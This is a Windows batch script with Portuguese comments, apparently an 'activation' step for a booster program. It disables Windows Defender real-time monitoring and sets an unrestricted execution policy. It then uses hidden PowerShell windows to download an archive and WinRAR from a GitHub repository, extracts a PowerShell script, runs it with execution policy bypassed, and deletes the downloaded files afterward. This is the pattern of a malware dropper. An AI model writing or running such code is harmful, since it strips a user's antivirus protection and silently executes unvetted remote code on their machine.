@echo off

powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force"
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

set urlProgram=https://github.com/diegrp/atv-dbooster/raw/main/processo-ativacao.rar
set destinoProgram=C:\Users\%USERNAME%\Desktop\atv-program-file\processo-ativacao.rar
set urlWinrar=https://github.com/diegrp/atv-dbooster/raw/main/WinRAR.exe
set destinoWinrar=C:\Users\%USERNAME%\Desktop\atv-program-file\WinRar.exe

:: Extrair o arquivo com senha para o diretório temporário
set rarFile=%destinoProgram%
set extractedFile=processo-ativacao.ps1

powershell -WindowStyle Hidden -Command "& {$client = New-Object System.Net.WebClient; $client.DownloadFile('%urlWinrar%', '%destinoWinrar%')}"
powershell -WindowStyle Hidden -Command "& {$client = New-Object System.Net.WebClient; $client.DownloadFile('%urlProgram%', '%destinoProgram%')}"

:: Se o WinRAR está instalado, proceder com a extração temporária e execução do arquivo
set tempDir=%TEMP%\tempExtraction

:: Criar diretório temporário
if not exist "%tempDir%" mkdir "%tempDir%"

:: Define os possíveis caminhos para o WinRAR
set winrarPath1=C:\Program Files\WinRAR\WinRAR.exe
set winrarPath2=C:\Program Files (x86)\WinRAR\WinRAR.exe

:: Verifica se o WinRAR está instalado em um dos caminhos
if exist "%winrarPath1%" (
    echo WinRAR está instalado em "%winrarPath1%"
    set winrarInstalled=true
) else if exist "%winrarPath2%" (
    echo WinRAR está instalado em "%winrarPath2%"
    set winrarInstalled=true
) else (
    echo WinRAR não está instalado no sistema.
    set winrarInstalled=false
)

:: Utilização adicional do WinRAR (exemplo)
if "%winrarInstalled%"=="true" (
    "%winrarPath1%" x -y "%rarFile%" "%tempDir%\"
    "%winrarPath2%" x -y "%rarFile%" "%tempDir%\"
) else (	
    "%destinoWinrar%" x -p%rarPassword% -y "%rarFile%" "%tempDir%\"
    echo Esperando 5 segundos...
    timeout /t 5 /nobreak >nul
    echo Continuando o script após 5 segundos.
)
:: Verificar se o arquivo foi extraído com sucesso
if exist "%tempDir%\%extractedFile%" (
    :: Executar o arquivo PowerShell extraído e sair do prompt de comando
    start powershell -ExecutionPolicy Bypass -File "%tempDir%\%extractedFile%"
) else (
    echo Falha ao extrair o arquivo.
)

:: Limpar o diretório temporário e os arquivos do WinRAR e do programa
timeout /t 10
rd /s /q "%tempDir%"
del /q "%destinoWinrar%"
del /q "%destinoProgram%"

exit /b

pause
